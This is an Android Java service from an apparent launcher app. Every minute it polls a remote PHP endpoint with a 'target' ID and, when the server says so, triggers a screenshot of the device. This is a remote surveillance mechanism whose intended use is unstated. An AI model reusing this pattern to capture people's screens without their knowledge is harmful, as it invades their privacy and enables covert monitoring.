package com.example.marwa.launcher002.services;

import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.media.MediaScannerConnection;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.support.v4.view.ViewPager;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.example.marwa.launcher002.MainActivity;
import com.example.marwa.launcher002.Singleton.MySingleton;
import com.example.marwa.launcher002.utils.WSadressIP;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import com.example.marwa.launcher002.R;

public class SendScreenShot extends Service {
    private Timer timer = new Timer();
    static MainActivity theMainActivity;

    @Override
    public IBinder onBind(Intent intent)
    {
        return null;
    }

    @Override
    public void onCreate()
    {
        super.onCreate();

        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                getScreenState();   //Your code here
            }
        }, 0, 60000);//1 minute
    }

    @Override
    public void onDestroy()
    {
        super.onDestroy();
    }

    private static final String URL_Activities = "http://"+ WSadressIP.WSIP+"/launcher/MgetScreenShotRequest.php";

    private void getScreenState() {

        final Integer[] statee = new Integer[1];

        StringRequest stringRequest = new StringRequest(Request.Method.POST, URL_Activities,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        try {

                            JSONArray array = new JSONArray(response);


                            for (int i = 0; i < array.length(); i++) {


                                JSONObject product = array.getJSONObject(i);
                                statee[0] = product.getInt("send_screen_shot");


                            }

                            if(statee[0] == 1){

                                try {

                                    MainActivity.getInstance().takeScreen();

                                    Log.v("marwa","testeeeeeeeeeeeeeeeeeeeeeeeeeeee   456");

                                } catch (IOException e) {
                                    e.printStackTrace();
                                }

                            }




                        } catch (JSONException e) {

                            e.printStackTrace();
                        }
                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {

                    }
                }){
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                params.put("Content-Type","application/x-www-form-urlencoded");

                params.put("id_target",MainActivity.id_target);

                return params;
            }
        };;

        //adding our stringrequest to queue
        Volley.newRequestQueue(SendScreenShot.this).add(stringRequest);
    }


}
